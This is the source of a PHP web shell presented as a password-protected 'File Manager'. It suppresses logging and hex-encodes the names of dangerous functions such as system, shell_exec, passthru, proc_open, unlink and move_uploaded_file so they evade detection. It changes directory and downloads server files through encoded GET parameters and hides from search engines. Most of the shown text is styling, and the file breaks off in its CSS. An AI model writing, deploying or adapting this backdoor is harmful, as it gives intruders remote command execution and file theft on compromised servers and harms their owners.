<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
$hashed_password = '$2y$10$ObqlJnHJLtsi5g6w/QSrdul0kXeq.JkJbgF9JdeDL9lpBZU5j3CVG';
$login_error = '';
// Check logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Check if already logged in
if (!isset($_SESSION['logged_in'])) {
    // Handle login POST request
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $login_error = "Invalid passphrase";
        }
    }
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>terminal@rushercloud:~$</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            body {
                background: #0a0e27;
                color: #00ff41;
                font-family: 'Courier New', 'Consolas', monospace;
                height: 100vh;
                overflow: hidden;
                position: relative;
            }

            /* Animated background grid */
            .grid-bg {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background:
                    linear-gradient(90deg, rgba(0, 255, 65, 0.03) 1px, transparent 1px),
                    linear-gradient(rgba(0, 255, 65, 0.03) 1px, transparent 1px);
                background-size: 50px 50px;
                animation: gridMove 20s linear infinite;
            }

            @keyframes gridMove {
                0% {
                    transform: translate(0, 0);
                }

                100% {
                    transform: translate(50px, 50px);
                }
            }

            /* Scanline effect */
            .scanline {
                position: absolute;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                background: linear-gradient(to bottom,
                        transparent 50%,
                        rgba(0, 255, 65, 0.02) 51%);
                background-size: 100% 4px;
                animation: scan 8s linear infinite;
                pointer-events: none;
                z-index: 10;
            }

            @keyframes scan {
                0% {
                    background-position: 0 0;
                }

                100% {
                    background-position: 0 100%;
                }
            }

            /* Terminal container */
            .terminal {
                position: relative;
                z-index: 5;
                width: 100%;
                height: 100vh;
                display: flex;
                flex-direction: column;
                padding: 2rem;
            }

            /* Header */
            .terminal-header {
                display: flex;
                align-items: center;
                gap: 1rem;
                margin-bottom: 2rem;
                padding-bottom: 1rem;
                border-bottom: 1px solid rgba(0, 255, 65, 0.3);
            }

            .terminal-buttons {
                display: flex;
                gap: 0.5rem;
            }

            .btn-circle {
                width: 14px;
                height: 14px;
                border-radius: 50%;
                border: 1px solid rgba(0, 255, 65, 0.5);
            }

            .btn-red {
                background: #ff5f56;
            }

            .btn-yellow {
                background: #ffbd2e;
            }

            .btn-green {
                background: #27c93f;
            }

            .terminal-title {
                color: #00ff41;
                font-size: 0.9rem;
                opacity: 0.8;
                letter-spacing: 1px;
            }

            /* Main content */
            .terminal-content {
                flex: 1;
                display: flex;
                flex-direction: column;
                justify-content: center;
                max-width: 800px;
                margin: 0 auto;
                width: 100%;
            }

            /* ASCII Art */
            .ascii-art {
                color: #00ff41;
                text-shadow: 0 0 10px rgba(0, 255, 65, 0.5);
                font-size: 0.7rem;
                line-height: 1.2;
                margin-bottom: 2rem;
                text-align: center;
                animation: glow 2s ease-in-out infinite;
            }

            @keyframes glow {

                0%,
                100% {
                    opacity: 0.8;
                }

                50% {
                    opacity: 1;
                    text-shadow: 0 0 20px rgba(0, 255, 65, 0.8);
                }
            }

            /* Boot sequence */
            .boot-text {
                margin-bottom: 2rem;
                line-height: 1.8;
            }

            .boot-line {
                display: flex;
                gap: 1rem;
                margin-bottom: 0.5rem;
                font-size: 0.9rem;
            }

            .status-ok {
                color: #00ff41;
            }

            .status-loading {
                color: #ffbd2e;
            }

            /* Login form */
            .login-form {
                background: rgba(10, 14, 39, 0.6);
                border: 1px solid rgba(0, 255, 65, 0.3);
                border-radius: 4px;
                padding: 2rem;
                box-shadow: 0 0 30px rgba(0, 255, 65, 0.1);
            }

            .prompt {
                display: flex;
                align-items: center;
                gap: 0.5rem;
                margin-bottom: 1.5rem;
                font-size: 1rem;
            }

            .prompt-symbol {
                color: #00ff41;
                font-weight: bold;
            }

            .prompt-path {
                color: #4a9eff;
            }

            .input-group {
                display: flex;
                align-items: center;
                gap: 1rem;
                margin-bottom: 1.5rem;
            }

            .input-label {
                color: #00ff41;
                min-width: 120px;
                font-size: 0.95rem;
            }

            .input-field {
                flex: 1;
                background: rgba(0, 0, 0, 0.5);
                border: 1px solid rgba(0, 255, 65, 0.4);
                color: #00ff41;
                padding: 0.75rem 1rem;
                font-family: 'Courier New', monospace;
                font-size: 1rem;
                outline: none;
                transition: all 0.3s;
                letter-spacing: 2px;
            }

            .input-field:focus {
                border-color: #00ff41;
                box-shadow: 0 0 15px rgba(0, 255, 65, 0.3);
                background: rgba(0, 0, 0, 0.7);
            }

            .input-field::placeholder {
                color: rgba(0, 255, 65, 0.3);
                letter-spacing: 1px;
            }

            /* Submit button */
            .submit-btn {
                width: 100%;
                background: transparent;
                border: 2px solid #00ff41;
                color: #00ff41;
                padding: 0.75rem;
                font-family: 'Courier New', monospace;
                font-size: 1rem;
                cursor: pointer;
                letter-spacing: 2px;
                transition: all 0.3s;
                text-transform: uppercase;
                position: relative;
                overflow: hidden;
            }

            .submit-btn::before {
                content: '';
                position: absolute;
                top: 0;
                left: -100%;
                width: 100%;
                height: 100%;
                background: rgba(0, 255, 65, 0.2);
                transition: left 0.3s;
            }

            .submit-btn:hover::before {
                left: 0;
            }

            .submit-btn:hover {
                background: #00ff41;
                color: #0a0e27;
                box-shadow: 0 0 20px rgba(0, 255, 65, 0.5);
                transform: translateY(-2px);
            }

            .submit-btn span {
                position: relative;
                z-index: 1;
            }

            /* Error message */
            .error-msg {
                background: rgba(255, 0, 0, 0.1);
                border: 1px solid #ff0000;
                color: #ff0000;
                padding: 1rem;
                margin-bottom: 1.5rem;
                border-radius: 4px;
                font-size: 0.9rem;
                animation: shake 0.5s;
            }

            @keyframes shake {

                0%,
                100% {
                    transform: translateX(0);
                }

                25% {
                    transform: translateX(-10px);
                }

                75% {
                    transform: translateX(10px);
                }
            }

            /* Footer info */
            .footer-info {
                margin-top: 2rem;
                text-align: center;
                font-size: 0.8rem;
                color: rgba(0, 255, 65, 0.5);
            }

            /* Responsive */
            @media (max-width: 768px) {
                .terminal {
                    padding: 1rem;
                }

                .ascii-art {
                    font-size: 0.5rem;
                }

                .input-group {
                    flex-direction: column;
                    align-items: stretch;
                }

                .input-label {
                    min-width: auto;
                }
            }
        </style>
    </head>

    <body>
        <div class="grid-bg"></div>
        <div class="scanline"></div>

        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-buttons">
                    <div class="btn-circle btn-red"></div>
                    <div class="btn-circle btn-yellow"></div>
                    <div class="btn-circle btn-green"></div>
                </div>
                <div class="terminal-title">root@rushercloud: ~</div>
            </div>

            <div class="terminal-content">
                <pre class="ascii-art">
 ____  _   _ ____  _   _ _____ ____   ____ _     ___  _   _ ____  
|  _ \| | | / ___|| | | | ____|  _ \ / ___| |   / _ \| | | |  _ \ 
| |_) | | | \___ \| |_| |  _| | |_) | |   | |  | | | | | | | | | |
|  _ <| |_| |___) |  _  | |___|  _ <| |___| |__| |_| | |_| | |_| |
|_| \_\\___/|____/|_| |_|_____|_| \_\\____|_____\___/ \___/|____/ 
            </pre>

                <div class="boot-text">
                    <div class="boot-line">
                        <span class="status-ok">[ OK ]</span>
                        <span>System initialized</span>
                    </div>
                    <div class="boot-line">
                        <span class="status-ok">[ OK ]</span>
                        <span>Network connection established</span>
                    </div>
                    <div class="boot-line">
                        <span class="status-ok">[ OK ]</span>
                        <span>File manager service started</span>
                    </div>
                    <div class="boot-line">
                        <span class="status-loading">[ INFO ]</span>
                        <span>Waiting for authentication...</span>
                    </div>
                </div>

                <div class="login-form">
                    <div class="prompt">
                        <span class="prompt-symbol">┌──(</span>
                        <span style="color: #ff0000;">root</span>
                        <span class="prompt-symbol">㉿</span>
                        <span class="prompt-path">rushercloud</span>
                        <span class="prompt-symbol">)-[</span>
                        <span style="color: #fff;">~/filemanager</span>
                        <span class="prompt-symbol">]</span>
                    </div>

                    <?php if ($login_error): ?>
                        <div class="error-msg">
                            <strong>ACCESS DENIED:</strong> <?php echo htmlspecialchars($login_error); ?>
                        </div>
                    <?php endif; ?>

                    <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                        <div class="input-group">
                            <label class="input-label">PASSPHRASE:</label>
                            <input
                                type="password"
                                class="input-field"
                                id="password"
                                name="password"
                                placeholder="Enter authentication key"
                                required
                                autocomplete="off"
                                autofocus>
                        </div>

                        <button type="submit" class="submit-btn">
                            <span>► Execute Access Protocol</span>
                        </button>
                    </form>

                    <div class="footer-info">
                        <p>⚠ Authorized Access Only | Session: <?php echo session_id(); ?> | IPv4: <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
                    </div>
                </div>
            </div>
        </div>

        <script>
            // Easter egg: Konami code
            let konamiCode = [];
            const konamiSequence = ['ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown', 'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight', 'b', 'a'];

            document.addEventListener('keydown', (e) => {
                konamiCode.push(e.key);
                konamiCode = konamiCode.slice(-10);

                if (konamiCode.join('') === konamiSequence.join('')) {
                    document.querySelector('.ascii-art').style.animation = 'glow 0.1s ease-in-out infinite';
                    setTimeout(() => {
                        document.querySelector('.ascii-art').style.animation = 'glow 2s ease-in-out infinite';
                    }, 2000);
                }
            });
        </script>
    </body>

    </html>
<?php
    exit;
}
$Array = [
    '676574637764', # ge  tcw d => 0 
    '676c6f62', # gl ob => 1 
    '69735f646972', # is_d ir => 2 
    '69735f66696c65', # is_ file => 3 
    '69735f7772697461626c65', # is_wr iteable => 4 
    '69735f7265616461626c65', # is_re adble => 5 
    '66696c657065726d73', # fileper ms => 6 
    '66696c65', # f ile => 7 
    '7068705f756e616d65', # php_unam e => 8 
    '6765745f63757272656e745f75736572', # getc urrentuser => 9 
    '68746d6c7370656369616c6368617273', # html special => 10 
    '66696c655f6765745f636f6e74656e7473', # fil e_get_contents => 11 
    '6d6b646972', # mk dir => 12 
    '746f756368', # to uch => 13 
    '6368646972', # ch dir => 14 
    '72656e616d65', # ren ame => 15 
    '65786563', # exe c => 16 
    '7061737374687275', # pas sthru => 17 
    '73797374656d', # syst em => 18 
    '7368656c6c5f65786563', # sh ell_exec => 19 
    '706f70656e', # p open => 20 
    '70636c6f7365', # pcl ose => 21 
    '73747265616d5f6765745f636f6e74656e7473', # stre amgetcontents => 22 
    '70726f635f6f70656e', # p roc_open => 23 
    '756e6c696e6b', # un link => 24 
    '726d646972', # rmd ir => 25 
    '666f70656e', # fop en => 26 
    '66636c6f7365', # fcl ose => 27 
    '66696c655f7075745f636f6e74656e7473', # file_put_c ontents => 28 
    '6d6f76655f75706c6f616465645f66696c65', # move_up loaded_file => 29 
    '63686d6f64', # ch mod => 30 
    '7379735f6765745f74656d705f646972', # temp _dir => 31 
    '6261736536345F6465636F6465', # => bas e6 4 _decode => 32 
    '6261736536345F656E636F6465', # => ba se6 4_ encode => 33 
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#4fc3f7"></i>';
    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#81c784"></i>';
    } else if (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js" style="color:#ffd54f"></i>';
    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#ff8a65"></i>';
    } else if (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#90caf9"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ef5350"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#81c784"></i>';
    }
}

function download($file)
{

    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if ($_GET['don'] == true) {
    $FilesDon = download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background:
                linear-gradient(rgba(10, 25, 47, 0.95), rgba(10, 25, 47, 0.95)),
                repeating-linear-gradient(0deg,
                    transparent,
                    transparent 2px,
                    rgba(100, 255, 218, 0.03) 2px,
                    rgba(100, 255, 218, 0.03) 4px),
                repeating-linear-gradient(90deg,
                    transparent,
                    transparent 2px,
                    rgba(100, 255, 218, 0.03) 2px,
                    rgba(100, 255, 218, 0.03) 4px);
            background-color: #0a192f;
            font-family: 'Roboto Mono', monospace;
            color: #64ffda;
            position: relative;
            padding: 12px;
            margin: 0;
        }

        /* Header Styles */
        .header-container {
            background: rgba(17, 34, 64, 0.6);
            border-radius: 8px;
            padding: 10px 15px;
            margin-bottom: 12px;
            max-height: 15%;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            border: 1px solid #64ffda;
        }

        .header-title {
            font-size: 18px;
            font-weight: 700;
            color: #64ffda;
            text-align: center;
            margin-bottom: 8px;
            text-shadow: 0 0 10px rgba(100, 255, 218, 0.5);
            letter-spacing: 3px;
            font-style: italic;
        }

        .system-info {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
            gap: 8px;
            margin-bottom: 8px;
        }

        .info-card {
            background: rgba(17, 34, 64, 0.4);
            padding: 6px 10px;
            border-radius: 4px;
            border-left: 2px solid #64ffda;
            transition: all 0.3s ease;
        }

        .info-card:hover {
            background: rgba(30, 58, 95, 0.8);
            transform: translateX(5px);
        }

        .info-card i {
            margin-right: 10px;
            color: #64ffda;
        }

        .info-label {
            color: #8892b0;
            font-size: 12px;
            display: block;
            margin-bottom: 5px;
        }

        .info-value {
            color: #ccd6f6;
            font-size: 14px;
            font-weight: 500;
        }

        /* Upload Form */
        .tools-upload-wrapper {
            background: rgba(17, 34, 64, 0.6);
            border-radius: 8px;
            padding: 12px 15px;
            margin-bottom: 12px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            border: 1px solid #64ffda;
            display: flex;
            align-items: center;
            gap: 15px;
            max-height: 10%;
        }

        .upload-form-inline {
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .file-input-wrapper {
            position: relative;
            display: inline-flex;
            align-items: center;
            gap: 8px;
        }

        .file-input {
            display: none;
        }

        .file-label {
            background: rgba(17, 34, 64, 0.8);
            color: #64ffda;
            border: 1px solid #64ffda;
            padding: 6px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Roboto Mono', monospace;
            font-weight: 600;
            font-size: 12px;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            white-space: nowrap;
        }

        .file-label:hover {
            background: rgba(100, 255, 218, 0.1);
            box-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
        }

        .file-label-text {
            display: inline-block;
            min-width: 80px;
        }

        .file-name {
            color: #64ffda;
            font-size: 11px;
            max-width: 200px;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
        }

        .btn-upload {
            padding: 6px 12px !important;
            font-size: 11px !important;
        }

        .tools-inline {
            display: inline-flex;
            gap: 8px;
            flex-wrap: wrap;
        }

        /* Button Styles */
        .btn {
            background: rgba(17, 34, 64, 0.6);
            color: #64ffda;
            border: 1px solid #64ffda;
            padding: 6px 15px;
            border-radius: 4px;
            cursor: pointer;
            font-family: 'Roboto Mono', monospace;
            font-weight: 600;
            font-size: 12px;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
        }

        .btn:hover {
            background: rgba(100, 255, 218, 0.1);
            color: #64ffda;
            border-color: #64ffda;
            box-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
        }

        .btn i {
            font-size: 13px;
        }

        .form-file {
            background: rgba(17, 34, 64, 0.6);
            color: #64ffda;
            border: 1px solid #64ffda;
            padding: 6px 12px;
            border-radius: 4px;
            font-family: 'Roboto Mono', monospace;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .form-file:hover {
            background: rgba(30, 58, 95, 0.8);
        }

        /* File Manager Section */
        .file-manager-container {
            background: rgba(17, 34, 64, 0.6);
            border-radius: 8px;
            padding: 15px;
            max-height: 75%;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
            border: 1px solid #64ffda;
        }

        .action-bar {
            display: flex;
            gap: 10px;
            margin-bottom: 12px;
            flex-wrap: wrap;
            padding: 10px;
            margin: -15px -15px 12px -15px;
            border-radius: 8px 8px 0 0;
            border-bottom: 1px solid #64ffda;
            background: rgba(17, 34, 64, 0.95);
            flex-shrink: 0;
        }

        .action-link {
            color: #64ffda;
            text-decoration: none;
            font-weight: 600;
            font-size: 12px;
            padding: 6px 12px;
            border-radius: 4px;
            background: rgba(17, 34, 64, 0.4);
            border: 1px solid #64ffda;
            transition: all 0.3s ease;
            display: inline-flex;
            align-items: center;
            gap: 5px;
        }

        .action-link:hover {
            background: rgba(100, 255, 218, 0.1);
            border-color: #64ffda;
            box-shadow: 0 0 10px rgba(100, 255, 218, 0.2);
        }

        /* Path Navigation */
        .path-navigation {
            background: rgba(17, 34, 64, 0.95);
            padding: 10px;
            border-radius: 4px;
            margin: 10px 0;
            border-left: 3px solid #64ffda;
            font-size: 12px;
            overflow-x: auto;
            white-space: nowrap;
            border-top: 1px solid rgba(100, 255, 218, 0.2);
            border-bottom: 1px solid rgba(100, 255, 218, 0.2);
            flex-shrink: 0;
        }

        .path-navigation a {
            color: #64ffda;
            text-decoration: none;
            padding: 3px 6px;
            border-radius: 3px;
            transition: all 0.3s ease;
            display: inline-block;
        }

        .path-navigation a:hover {
            background: rgba(100, 255, 218, 0.2);
            transform: scale(1.05);
        }

        /* Table Styles */
        .table-wrapper {
            overflow: auto;
            height: auto;
            max-height: 400px;
            scrollbar-width: thin;
            scrollbar-color: #64ffda rgba(17, 34, 64, 0.6);
        }

        .table-wrapper::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        .table-wrapper::-webkit-scrollbar-track {
            background: rgba(17, 34, 64, 0.6);
            border-radius: 4px;
        }

        .table-wrapper::-webkit-scrollbar-thumb {
            background: #64ffda;
            border-radius: 4px;
        }

        .table-wrapper::-webkit-scrollbar-thumb:hover {
            background: #52e8c5;
        }

        .file-table {
            width: 100%;
            border-collapse: separate;
            border-spacing: 0;
            border-radius: 6px;
            position: relative;
        }

        .file-table thead {
            background: rgba(17, 34, 64, 0.95);
            position: sticky;
            top: 0;
            z-index: 1;
        }

        .file-table thead th {
            padding: 8px;
            text-align: left;
            color: #64ffda;
            font-weight: 600;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            border-bottom: 2px solid #64ffda;
            background: rgba(17, 34, 64, 0.95);
        }

        .file-table tbody tr {
            background: rgba(17, 34, 64, 0.3);
            transition: all 0.3s ease;
        }

        .file-table tbody tr:nth-child(even) {
            background: rgba(17, 34, 64, 0.5);
        }

        .file-table tbody tr:hover {
            background: rgba(100, 255, 218, 0.1);
        }

        .file-table tbody td {
            padding: 8px;
            color: #ccd6f6;
            border-bottom: 1px solid rgba(100, 255, 218, 0.1);
            font-size: 12px;
        }

        .file-table tbody td a {
            color: #64ffda;
            text-decoration: none;
            transition: all 0.3s ease;
        }

        .file-table tbody td a:hover {
            color: #4fc3f7;
            text-decoration: underline;
        }

        .file-table tbody td:nth-child(2),
        .file-table tbody td:nth-child(3),
        .file-table tbody td:nth-child(4) {
            text-align: center;
        }

        /* Action Icons */
        .action-icon {
            color: #64ffda;
            font-size: 18px;
            margin: 0 5px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: inline-block;
        }

        .action-icon:hover {
            color: #4fc3f7;
            transform: scale(1.2);
        }

        /* Bulk Actions */
        .bulk-actions {
            display: flex;
            gap: 8px;
            align-items: center;
            margin-top: 10px;
            padding-top: 10px;
            border-top: 1px solid rgba(100, 255, 218, 0.3);
            flex-wrap: wrap;
            flex-shrink: 0;
        }

        .bulk-actions select {
            background: rgba(17, 34, 64, 0.6);
            color: #64ffda;
            border: 1px solid #64ffda;
            padding: 6px 12px;
            border-radius: 4px;
            font-family: 'Roboto Mono', monospace;
            font-size: 12px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .bulk-actions select:hover {
            background: rgba(17, 34, 64, 0.8);
        }

        /* Modal Styles */
        .modal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            z-index: 9999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .modal.active {
            display: flex;
        }

        .modal-container {
            background: rgba(17, 34, 64, 0.95);
            border-radius: 8px;
            max-width: 700px;
            width: 100%;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.7);
            border: 1px solid #64ffda;
            animation: modalFadeIn 0.3s ease;
        }

        @keyframes modalFadeIn {
            from {
                opacity: 0;
                transform: scale(0.9);
            }

            to {
                opacity: 1;
                transform: scale(1);
            }
        }

        .modal-header {
            background: rgba(17, 34, 64, 0.8);
            padding: 12px 15px;
            border-bottom: 1px solid #64ffda;
            border-radius: 8px 8px 0 0;
        }

        .modal-header h3 {
            color: #64ffda;
            font-size: 16px;
            font-weight: 600;
        }

        .modal-body {
            padding: 15px;
        }

        .modal-input {
            width: 100%;
            padding: 8px;
            background: rgba(10, 25, 47, 0.8);
            border: 1px solid #64ffda;
            border-radius: 4px;
            color: #64ffda;
            font-family: 'Roboto Mono', monospace;
            font-size: 12px;
            margin-bottom: 10px;
            transition: all 0.3s ease;
        }

        .modal-input:focus {
            outline: none;
            background: rgba(10, 25, 47, 0.9);
            box-shadow: 0 0 10px rgba(100, 255, 218, 0.3);
        }

        .modal-textarea {
            width: 100%;
            min-height: 100px;
            padding: 8px;
            background: rgba(10, 25, 47, 0.8);
            border: 1px solid #64ffda;
            border-radius: 4px;
            color: #64ffda;
            font-family: 'Roboto Mono', monospace;
            font-size: 12px;
            resize: vertical;
            margin-bottom: 10px;
        }

        .modal-footer {
            padding: 10px 15px;
            display: flex;
            gap: 8px;
            justify-content: flex-end;
            border-top: 1px solid rgba(100, 255, 218, 0.2);
        }

        /* Code Editor Styles */
        .code-editor {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .code-editor-container {
            background: linear-gradient(135deg, #1e3a5f 0%, #2a4a6f 100%);
            border-radius: 10px;
            width: 95%;
            max-width: 1400px;
            height: 85vh;
            max-height: 85vh;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 3px solid #64ffda;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        .code-editor-head {
            background: linear-gradient(135deg, #2a4a6f 0%, #1e3a5f 100%);
            padding: 12px;
            border-bottom: 2px solid #64ffda;
            border-radius: 10px 10px 0 0;
            flex-shrink: 0;
        }

        .code-editor-head h3 {
            color: #64ffda;
            font-size: 16px;
            font-weight: 600;
        }

        .code-editor-body {
            flex: 1;
            padding: 15px;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            min-height: 0;
        }

        .code-editor-body form {
            flex: 1;
            display: flex;
            flex-direction: column;
            overflow: hidden;
            min-height: 0;
        }

        .CodeMirror {
            height: 100% !important;
            max-height: 100% !important;
            border-radius: 10px;
            font-size: 14px;
            border: 2px solid #64ffda;
        }

        /* Terminal Styles */
        .terminal {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.9);
            z-index: 9999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .terminal-container {
            background: linear-gradient(135deg, #1e3a5f 0%, #2a4a6f 100%);
            border-radius: 10px;
            width: 95%;
            max-width: 1200px;
            max-height: 90vh;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            border: 3px solid #64ffda;
            display: flex;
            flex-direction: column;
        }

        .terminal-head {
            background: linear-gradient(135deg, #2a4a6f 0%, #1e3a5f 100%);
            padding: 12px;
            border-bottom: 2px solid #64ffda;
            border-radius: 10px 10px 0 0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .terminal-head h3 {
            color: #64ffda;
            font-size: 16px;
            font-weight: 600;
        }

        .terminal-body {
            padding: 15px;
            flex: 1;
            overflow-y: auto;
        }

        .terminal-body textarea {
            width: 100%;
            min-height: 250px;
            padding: 10px;
            background: #0a192f;
            border: 2px solid #64ffda;
            border-radius: 6px;
            color: #64ffda;
            font-family: 'Roboto Mono', monospace;
            font-size: 13px;
            resize: vertical;
        }

        .terminal-input-group {
            display: flex;
            gap: 8px;
            margin-top: 10px;
        }

        .terminal-input {
            flex: 1;
            padding: 8px;
            background: #0a192f;
            border: 2px solid #64ffda;
            border-radius: 6px;
            color: #64ffda;
            font-family: 'Roboto Mono', monospace;
            font-size: 13px;
        }

        /* Scrollbar Styles */
        ::-webkit-scrollbar {
            width: 12px;
            height: 12px;
        }

        ::-webkit-scrollbar-track {
            background: #0a192f;
            border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, #2a4a6f 0%, #64ffda 100%);
            border-radius: 10px;
            border: 2px solid #0a192f;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, #64ffda 0%, #4fc3f7 100%);
        }

        /* Responsive Design */
        @media screen and (max-width: 768px) {
            body {
                padding: 8px;
            }

            .header-title {
                font-size: 18px;
            }

            .system-info {
                grid-template-columns: 1fr;
            }

            .tools-grid {
                flex-direction: column;
            }

            .btn {
                width: 100%;
                justify-content: center;
            }

            .file-table {
                font-size: 11px;
            }

            .file-table thead th,
            .file-table tbody td {
                padding: 8px 4px;
            }

            .modal-container {
                width: 95%;
            }

            .code-editor-container,
            .terminal-container {
                width: 100%;
                height: 100vh;
                border-radius: 0;
            }
        }

        /* Utility Classes */
        .text-center {
            text-align: center;
        }

        .text-success {
            color: #64ffda;
        }

        .text-warning {
            color: #ffd54f;
        }

        .text-danger {
            color: #ef5350;
        }

        .text-info {
            color: #4fc3f7;
        }

        /* Badge Styles */
        .badge {
            padding: 4px 12px;
            border-radius: 12px;
            font-size: 12px;
            font-weight: 600;
            display: inline-block;
        }

        .badge-dir {
            background: linear-gradient(135deg, #ff8a65 0%, #ff6f4f 100%);
            color: #fff;
        }

        .badge-file {
            background: linear-gradient(135deg, #4fc3f7 0%, #29b6f6 100%);
            color: #fff;
        }

        /* Close Button */
        .close-btn {
            color: #ef5350;
            font-size: 24px;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .close-btn:hover {
